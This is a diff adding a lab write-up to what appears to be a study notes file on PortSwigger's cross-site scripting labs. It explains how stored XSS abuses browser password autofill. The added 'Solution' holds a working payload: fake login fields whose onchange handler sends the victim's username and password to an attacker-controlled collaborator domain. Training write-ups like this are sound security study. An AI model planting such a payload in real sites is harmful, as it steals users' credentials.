@@ -94,6 +94,27 @@ https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealin
 
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
 
+In this lab, we see how we can steal a victim's credentials by exploiting browsers **autofill** functionality.
+
+*Read more about this technique: https://ancat.github.io/xss/2017/01/08/stealing-plaintext-passwords.html*
+
+The stored XSS is again located in the comment section of the application. Our goal is to create a fake `input` field that will induce the victim's browser to autofill credentials that match for the website's domain name.
+
+Then, we exfiltrate the content by combining the `onchange` event with a call to the [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) API to a domain under our control. This will send us the victim's credentials as soon as the input field is filled with data.
+
+**Solution**
+
+```
+<b>Username:</><br>
+<input name=username id=username>
+<b>Password:</><br>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
 ### Lab 12 - Exploiting stored XSS to perform CSRF
 
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
